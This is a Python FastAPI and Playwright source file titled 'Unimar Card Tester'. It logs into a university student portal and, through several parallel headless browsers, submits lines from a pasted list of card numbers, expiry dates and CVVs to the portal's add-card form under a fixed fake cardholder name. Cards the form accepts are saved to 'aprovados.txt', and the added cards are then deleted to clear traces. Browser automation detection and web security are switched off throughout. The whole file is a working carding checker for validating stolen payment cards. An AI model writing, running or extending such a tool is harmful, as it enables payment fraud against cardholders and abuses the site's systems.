import asyncio
import os
import random
import sys
import time
from contextlib import asynccontextmanager
from pathlib import Path
from typing import Set

from fastapi import FastAPI, WebSocket, WebSocketDisconnect, Request
from fastapi.responses import HTMLResponse
from pydantic import BaseModel, field_validator

# ===================== CONFIGURAÇÕES =====================
URL_LOGIN = os.getenv("UNIMAR_URL_LOGIN", "https://digital.unimar.br/login")
URL_MEUS_CARTOES = os.getenv("UNIMAR_URL_CARTOES", "https://digital.unimar.br/areadoaluno/conta/meuscartoes")
EMAIL = os.getenv("UNIMAR_EMAIL", "")
SENHA = os.getenv("UNIMAR_SENHA", "")
NOME_FIXO = os.getenv("UNIMAR_NOME", "Bruna Mendes")
MAX_TENTATIVAS = int(os.getenv("UNIMAR_MAX_TENTATIVAS", "3"))
MAX_CANAIS = int(os.getenv("UNIMAR_MAX_CANAIS", "6"))

VIEWPORT = {"width": 1280, "height": 720}
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"

BROWSER_ARGS = [
    "--no-sandbox",
    "--disable-dev-shm-usage",
    "--disable-gpu",
    "--disable-web-security",
    "--disable-features=IsolateOrigins,site-per-process",
    "--disable-blink-features=AutomationControlled",
    "--disable-setuid-sandbox",
]

SESSAO_PATH = Path("sessao_unimar.json")
SESSAO_MAX_AGE = 86400

# ===================== ESTADO GLOBAL =====================
class Estado:
    def __init__(self):
        self.lock = asyncio.Lock()
        self.rodando = False
        self.cancelado = False
        self.clients = set()
        self.total_cartoes = 0
        self.tarefas_concluidas = 0
        self.aprovados = 0
        self.inicio_timestamp = 0
        self.canais_ativos = 0

estado = Estado()

# ===================== FUNÇÕES AUXILIARES =====================
def log(mensagem: str):
    """Log com timestamp e broadcast."""
    timestamp = time.strftime("%H:%M:%S")
    full_msg = f"[{timestamp}] {mensagem}"
    print(full_msg)
    try:
        asyncio.create_task(broadcast_msg("log", {"mensagem": full_msg}))
    except:
        pass

async def broadcast_msg(type: str, data: dict = None):
    """Envia mensagem para todos os clientes WebSocket."""
    if data is None:
        data = {}
    message = {"type": type, **data}
    dead = set()
    
    for client in list(estado.clients):
        try:
            await client.send_json(message)
        except:
            dead.add(client)
    
    estado.clients -= dead

# ===================== MODELOS =====================
class IniciarRequest(BaseModel):
    lista: str
    canais: int = 4
    
    @field_validator('canais')
    @classmethod
    def validar_canais(cls, v):
        if v < 1 or v > MAX_CANAIS:
            raise ValueError(f'Canais deve ser entre 1 e {MAX_CANAIS}')
        return v

# ===================== APLICAÇÃO FASTAPI =====================
@asynccontextmanager
async def lifespan(app: FastAPI):
    """Inicialização e finalização da aplicação."""
    print("=" * 60)
    print("🚀 UNIMAR CARD TESTER INICIANDO")
    print(f"📧 Email: {'Configurado' if EMAIL else 'NÃO CONFIGURADO'}")
    print(f"🔑 Senha: {'Configurada' if SENHA else 'NÃO CONFIGURADA'}")
    print(f"📁 Sessão: {SESSAO_PATH}")
    print("=" * 60)
    
    # Criar diretórios e arquivos necessários
    Path("templates").mkdir(exist_ok=True)
    Path("aprovados.txt").touch(exist_ok=True)
    
    yield
    
    print("👋 Aplicação finalizada")

app = FastAPI(title="Unimar Card Tester", lifespan=lifespan)

# ===================== WEBSOCKET =====================
@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket):
    await websocket.accept()
    estado.clients.add(websocket)
    
    try:
        await websocket.send_json({
            "type": "status",
            "rodando": estado.rodando,
            "total": estado.total_cartoes,
            "processados": estado.tarefas_concluidas,
            "aprovados": estado.aprovados,
            "canais_ativos": estado.canais_ativos
        })
    except:
        estado.clients.discard(websocket)
        return
    
    try:
        while True:
            data = await websocket.receive_json()
            if data.get("type") == "pong":
                continue
    except WebSocketDisconnect:
        pass
    except Exception:
        pass
    finally:
        estado.clients.discard(websocket)

# ===================== FUNÇÕES PLAYWRIGHT =====================
async def sessao_valida(playwright) -> bool:
    """Verifica se a sessão salva ainda é válida."""
    if not SESSAO_PATH.exists():
        return False
    if time.time() - SESSAO_PATH.stat().st_mtime > SESSAO_MAX_AGE:
        return False
    
    try:
        browser = await playwright.chromium.launch(headless=True, args=BROWSER_ARGS)
        context = await browser.new_context(viewport=VIEWPORT, user_agent=USER_AGENT)
        page = await context.new_page()
        
        await page.goto(URL_MEUS_CARTOES, wait_until="domcontentloaded", timeout=15000)
        await asyncio.sleep(0.8)
        valida = await page.get_by_role("button", name="Adicionar Cartão de Crédito").count() > 0
        
        await context.close()
        await browser.close()
        return valida
    except Exception as e:
        print(f"[AVISO] Erro validar sessão: {e}")
        return False

async def limpar_cartoes(page):
    """Remove cartões existentes."""
    try:
        log("[Faxina] Iniciando limpeza...")
        await page.goto(URL_MEUS_CARTOES, wait_until="domcontentloaded", timeout=30000)
        await asyncio.sleep(1.5)
        
        removidos = 0
        for _ in range(50):
            if estado.cancelado:
                break
            
            botoes = page.get_by_role("button", name="Remover")
            if await botoes.count() == 0:
                break
            
            try:
                await botoes.first.click(force=True, timeout=5000)
                await asyncio.sleep(0.5)
                removidos += 1
            except:
                break
        
        log(f"[Faxina] {removidos} removidos")
    except Exception as e:
        log(f"[Faxina] Erro: {e}")

async def login_mestre(playwright) -> bool:
    """Realiza login no sistema."""
    try:
        if await sessao_valida(playwright):
            log("[Auth] Sessão reutilizada (Modo Fast)")
            return True
        
        if not EMAIL or not SENHA:
            log("[ERRO] Email/senha não configurados!")
            return False
        
        log("[Auth] Login completo (Modo Full)...")
        browser = await playwright.chromium.launch(headless=True, args=BROWSER_ARGS)
        context = await browser.new_context(viewport=VIEWPORT, user_agent=USER_AGENT)
        page = await context.new_page()
        page.on("dialog", lambda dialog: asyncio.create_task(dialog.accept()))
        
        await page.goto(URL_LOGIN, wait_until="domcontentloaded", timeout=60000)
        await page.get_by_role("textbox", name="E-mail ou CPF").fill(EMAIL)
        await page.get_by_role("textbox", name="Senha").fill(SENHA)
        await page.get_by_role("button", name="Entrar").click()
        await page.wait_for_selector("text=Meus Cartões", timeout=30000)
        
        await limpar_cartoes(page)
        await context.storage_state(path=str(SESSAO_PATH))
        
        await context.close()
        await browser.close()
        log("[Auth] Login concluído!")
        return True
    except Exception as e:
        log(f"[ERRO] Login falhou: {e}")
        return False

async def processar_cartao(page, numero, mes, ano, cvv):
    """Processa um único cartão."""
    try:
        await page.goto(URL_MEUS_CARTOES, wait_until="domcontentloaded", timeout=30000)
        await asyncio.sleep(random.uniform(0.4, 1.0))
        
        btn_add = page.get_by_role("button", name="Adicionar Cartão de Crédito")
        await btn_add.click(force=True)
        await asyncio.sleep(0.5)
        
        await page.get_by_role("textbox", name="Número do cartão").fill(numero)
        await page.get_by_role("textbox", name="Nome impresso no cartão").fill(NOME_FIXO)
        await page.get_by_label("Mês").select_option(mes)
        await page.get_by_label("Ano").select_option(ano)
        await page.get_by_role("textbox", name="CVV").fill(cvv)
        
        botoes_antes = await page.get_by_role("button", name="Remover").count()
        await page.get_by_role("button", name="Registrar Cartão de Crédito").click(force=True)
        
        # Detectar resultado
        for _ in range(40):
            if estado.cancelado:
                return "cancelado"
            
            botoes_atual = await page.get_by_role("button", name="Remover").count()
            if botoes_atual > botoes_antes:
                return "aprovado"
            
            try:
                body = (await page.locator("body").inner_text()).lower()
                erros = ["inválida", "recusado", "erro", "não foi possível", "inválido"]
                if any(x in body for x in erros):
                    return "reprovado"
            except:
                pass
            
            await asyncio.sleep(0.5)
        
        return "timeout"
    except Exception as e:
        print(f"[ERRO] processar_cartao: {e}")
        return "erro"

async def worker(id_worker: int, browser, fila: asyncio.Queue):
    """Worker que processa cartões da fila."""
    estado.canais_ativos += 1
    await broadcast_msg("status", {"canais_ativos": estado.canais_ativos})
    
    try:
        await asyncio.sleep(id_worker * 1.2)
        log(f"[Canal {id_worker}] Iniciando")
        
        context = await browser.new_context(
            storage_state=str(SESSAO_PATH),
            viewport=VIEWPORT,
            user_agent=USER_AGENT
        )
        page = await context.new_page()
        page.on("dialog", lambda dialog: asyncio.create_task(dialog.accept()))
        
        while estado.rodando and not estado.cancelado:
            try:
                item = await asyncio.wait_for(fila.get(), timeout=2.0)
            except asyncio.TimeoutError:
                if fila.empty() and estado.tarefas_concluidas >= estado.total_cartoes:
                    break
                continue
            
            indice, linha, tentativa = item
            partes = [x.strip() for x in linha.split("|")]
            
            if len(partes) != 4:
                log(f"[Canal {id_worker}][{indice}] ❌ Formato inválido")
                fila.task_done()
                estado.tarefas_concluidas += 1
                await broadcast_msg("reprovado", {"cartao": linha})
                continue
            
            numero, mes, ano, cvv = partes
            log(f"[Canal {id_worker}][{indice}] ****{numero[-4:]}")
            
            resultado = await processar_cartao(page, numero, mes, ano, cvv)
            
            if resultado == "aprovado":
                log(f"[Canal {id_worker}][{indice}] ✅ APROVADO")
                await broadcast_msg("aprovado", {"cartao": linha})
                estado.aprovados += 1
                with open("aprovados.txt", "a") as f:
                    f.write(f"{linha}\n")
            
            elif resultado == "reprovado":
                log(f"[Canal {id_worker}][{indice}] ❌ Reprovado")
                await broadcast_msg("reprovado", {"cartao": linha})
            
            elif resultado == "timeout" and tentativa < MAX_TENTATIVAS:
                log(f"[Canal {id_worker}][{indice}] ⚠️ Timeout - Retentativa {tentativa + 1}")
                await fila.put((indice, linha, tentativa + 1))
                fila.task_done()
                continue
            
            else:
                if resultado == "timeout":
                    log(f"[Canal {id_worker}][{indice}] ❌ Timeout máximo")
                elif resultado == "cancelado":
                    log(f"[Canal {id_worker}][{indice}] ⏹️ Cancelado")
                await broadcast_msg("reprovado", {"cartao": linha})
            
            fila.task_done()
            estado.tarefas_concluidas += 1
            
            elapsed = time.time() - estado.inicio_timestamp if estado.inicio_timestamp else 0
            velocidade = estado.tarefas_concluidas / (elapsed / 60) if elapsed > 0 else 0
            
            await broadcast_msg("progresso", {
                "processados": estado.tarefas_concluidas,
                "total": estado.total_cartoes,
                "aprovados": estado.aprovados,
                "velocidade": round(velocidade, 1),
                "tempo": round(elapsed),
            })
        
        await context.close()
    except Exception as e:
        log(f"[Canal {id_worker}] ERRO: {e}")
    finally:
        estado.canais_ativos -= 1
        await broadcast_msg("status", {"canais_ativos": estado.canais_ativos})
        log(f"[Canal {id_worker}] Finalizado")

async def processar_todos_cartoes(texto_cartoes: str, num_canais: int):
    """Processa todos os cartões da lista."""
    try:
        linhas = list(dict.fromkeys([l.strip() for l in texto_cartoes.splitlines() if l.strip()]))
        
        if not linhas:
            log("[ERRO] Nenhum cartão fornecido")
            return
        
        estado.total_cartoes = len(linhas)
        estado.tarefas_concluidas = 0
        estado.aprovados = 0
        estado.cancelado = False
        estado.inicio_timestamp = time.time()
        
        num_canais = min(max(num_canais, 1), MAX_CANAIS, len(linhas))
        log(f"[Sistema] {num_canais} canais | {len(linhas)} cartões")
        
        fila = asyncio.Queue()
        for idx, linha in enumerate(linhas, 1):
            await fila.put((idx, linha, 1))
        
        from playwright.async_api import async_playwright
        
        async with async_playwright() as pw:
            if not await login_mestre(pw):
                log("[ERRO] Falha na autenticação")
                return
            
            browser = await pw.chromium.launch(headless=True, args=BROWSER_ARGS)
            
            try:
                tasks = [asyncio.create_task(worker(i, browser, fila)) for i in range(1, num_canais + 1)]
                await asyncio.gather(*tasks, return_exceptions=True)
                
                if estado.aprovados > 0 and not estado.cancelado:
                    log("[Sistema] Faxina final...")
                    try:
                        ctx = await browser.new_context(storage_state=str(SESSAO_PATH), viewport=VIEWPORT, user_agent=USER_AGENT)
                        pg = await ctx.new_page()
                        pg.on("dialog", lambda d: asyncio.create_task(d.accept()))
                        await limpar_cartoes(pg)
                        await ctx.close()
                    except Exception as e:
                        log(f"[Faxina] Erro: {e}")
            finally:
                await browser.close()
    
    except Exception as e:
        log(f"[ERRO CRÍTICO] {e}")
    finally:
        estado.rodando = False
        estado.cancelado = False
        estado.canais_ativos = 0
        log("[Sistema] Processamento concluído!")
        await broadcast_msg("status", {"rodando": False, "canais_ativos": 0})

# ===================== ROTAS API =====================
@app.post("/api/iniciar")
async def iniciar(data: IniciarRequest):
    if estado.rodando:
        return {"status": "já_em_execucao"}
    
    estado.rodando = True
    estado.cancelado = False
    await broadcast_msg("status", {"rodando": True})
    asyncio.create_task(processar_todos_cartoes(data.lista, data.canais))
    
    return {"status": "iniciado"}

@app.post("/api/parar")
async def parar():
    estado.rodando = False
    estado.cancelado = True
    log("⛔ Interrupção solicitada")
    await broadcast_msg("status", {"rodando": False})
    return {"status": "parando"}

@app.get("/api/status")
async def status():
    elapsed = time.time() - estado.inicio_timestamp if estado.inicio_timestamp else 0
    velocidade = estado.tarefas_concluidas / (elapsed / 60) if elapsed > 0 else 0
    
    return {
        "rodando": estado.rodando,
        "total": estado.total_cartoes,
        "processados": estado.tarefas_concluidas,
        "aprovados": estado.aprovados,
        "canais_ativos": estado.canais_ativos,
        "velocidade": round(velocidade, 1),
        "tempo": round(elapsed),
    }

@app.get("/api/health")
async def health():
    return {"status": "ok", "timestamp": time.time()}

@app.get("/", response_class=HTMLResponse)
async def index():
    try:
        with open("templates/index.html", encoding="utf-8") as f:
            return f.read()
    except:
        return """
        <html>
        <head><title>Unimar Card Tester</title>
        <style>body{background:#111;color:#fff;font-family:sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;margin:0}
        .box{text-align:center;padding:40px;background:#1a1a1a;border-radius:20px;border:1px solid #333}
        h1{color:#3b82f6;margin-bottom:10px}
        .status{display:inline-block;width:10px;height:10px;background:#10b981;border-radius:50%;margin-right:8px;animation:pulse 2s infinite}
        @keyframes pulse{0%,100%{opacity:1}50%{opacity:0.5}}
        .links{margin-top:20px;display:flex;gap:10px;justify-content:center}
        a{color:#3b82f6;text-decoration:none;padding:8px 16px;background:#222;border-radius:8px;transition:all 0.3s}
        a:hover{background:#333}
        </style></head>
        <body>
        <div class="box">
            <h1><span class="status"></span>🚀 API Online</h1>
            <p style="color:#888">Unimar Card Tester v1.0</p>
            <div class="links">
                <a href="/api/health">Health Check</a>
                <a href="/api/status">Status</a>
                <a href="/docs">Documentação</a>
            </div>
        </div>
        </body></html>"""

# ===================== INICIALIZAÇÃO =====================
if __name__ == "__main__":
    import uvicorn
    
    PORT = int(os.getenv("PORT", "8000"))
    
    print("=" * 60)
    print("🚀 UNIMAR CARD TESTER")
    print(f"📍 Iniciando em 0.0.0.0:{PORT}")
    print(f"🔗 Health: http://0.0.0.0:{PORT}/api/health")
    print(f"📡 WebSocket: ws://0.0.0.0:{PORT}/ws")
    print("=" * 60)
    
    # Iniciar servidor
    uvicorn.run(
        app,
        host="0.0.0.0",
        port=PORT,
        log_level="info",
        access_log=True
    )
